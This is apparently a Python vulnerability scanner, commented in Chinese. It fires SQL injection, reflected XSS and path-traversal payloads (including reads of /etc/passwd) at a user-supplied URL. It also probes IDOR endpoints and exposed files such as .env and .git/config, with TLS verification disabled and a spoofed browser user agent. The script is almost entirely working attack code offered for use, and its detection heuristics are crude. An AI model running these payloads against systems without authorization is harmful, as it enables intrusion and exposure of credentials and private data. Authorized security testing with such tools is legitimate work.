#!/usr/bin/env python3
"""
快速漏洞验证脚本 - 自动测试常见漏洞
用法: python3 exploit_tester.py -u https://target.com
"""

import requests
import argparse
import concurrent.futures
from urllib.parse import urljoin
import warnings
warnings.filterwarnings('ignore')

class ExploitTester:
    def __init__(self, target):
        self.target = target
        self.vulns = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
        }
    
    def test_sql_injection(self):
        """SQL注入快速测试"""
        paths = ['/search', '/user', '/product', '/api/user']
        payloads = ["'", "' OR '1'='1", "' AND 1=2--", "1' UNION SELECT NULL--"]
        
        for path in paths:
            url = urljoin(self.target, path)
            for payload in payloads:
                try:
                    r = self.session.get(f"{url}?id={payload}", timeout=3)
                    if any(x in r.text.lower() for x in ['sql', 'mysql', 'syntax', 'error']):
                        self.vulns.append(f"[SQL注入] {url}?id={payload}")
                        return True
                except:
                    pass
        return False
    
    def test_idor(self):
        """IDOR快速测试"""
        endpoints = [
            '/api/user/1', '/api/user/2',
            '/api/order/1', '/api/order/2',
            '/user/1', '/user/2'
        ]
        
        results = []
        for endpoint in endpoints:
            try:
                url = urljoin(self.target, endpoint)
                r = self.session.get(url, timeout=3)
                if r.status_code == 200:
                    results.append((endpoint, len(r.text)))
            except:
                pass
        
        # 检查响应差异（IDOR特征）
        if len(results) >= 2:
            if results[0][1] != results[1][1]:
                self.vulns.append(f"[IDOR] {self.target}/api/user/{{id}}")
                return True
        return False
    
    def test_xss(self):
        """XSS快速测试"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
        
        paths = ['/search', '/comment', '/message']
        
        for path in paths:
            for payload in payloads:
                try:
                    url = urljoin(self.target, path)
                    r = self.session.get(f"{url}?q={payload}", timeout=3)
                    if payload in r.text:
                        self.vulns.append(f"[XSS] {url}?q=...")
                        return True
                except:
                    pass
        return False
    
    def test_lfi(self):
        """LFI快速测试"""
        payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd'
        ]
        
        paths = ['/download', '/file', '/view', '/read']
        
        for path in paths:
            for payload in payloads:
                try:
                    url = urljoin(self.target, path)
                    r = self.session.get(f"{url}?file={payload}", timeout=3)
                    if 'root:x:0:0' in r.text:
                        self.vulns.append(f"[LFI] {url}?file=...")
                        return True
                except:
                    pass
        return False
    
    def test_unauthorized_access(self):
        """未授权访问测试"""
        endpoints = [
            '/admin', '/admin/', '/admin/dashboard',
            '/api/admin', '/api/users', '/api/config',
            '/phpmyadmin', '/.git/config', '/.env'
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.target, endpoint)
                r = self.session.get(url, timeout=3)
                if r.status_code == 200 and len(r.text) > 100:
                    self.vulns.append(f"[未授权] {url}")
            except:
                pass
    
    def test_all(self):
        """并行测试所有漏洞"""
        print(f"[*] 测试目标: {self.target}\n")
        
        tests = [
            ("SQL注入", self.test_sql_injection),
            ("IDOR", self.test_idor),
            ("XSS", self.test_xss),
            ("LFI", self.test_lfi),
            ("未授权访问", self.test_unauthorized_access),
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(test[1]): test[0] for test in tests}
            
            for future in concurrent.futures.as_completed(futures):
                test_name = futures[future]
                try:
                    result = future.result()
                    status = "✓" if result else "✗"
                    print(f"[{status}] {test_name}")
                except Exception as e:
                    print(f"[!] {test_name} 错误: {e}")
        
        print(f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"【发现漏洞】({len(self.vulns)}个)")
        print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        if self.vulns:
            for vuln in self.vulns:
                print(f"  {vuln}")
        else:
            print("  无明显漏洞")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='快速漏洞验证工具')
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    args = parser.parse_args()
    
    tester = ExploitTester(args.url)
    tester.test_all()
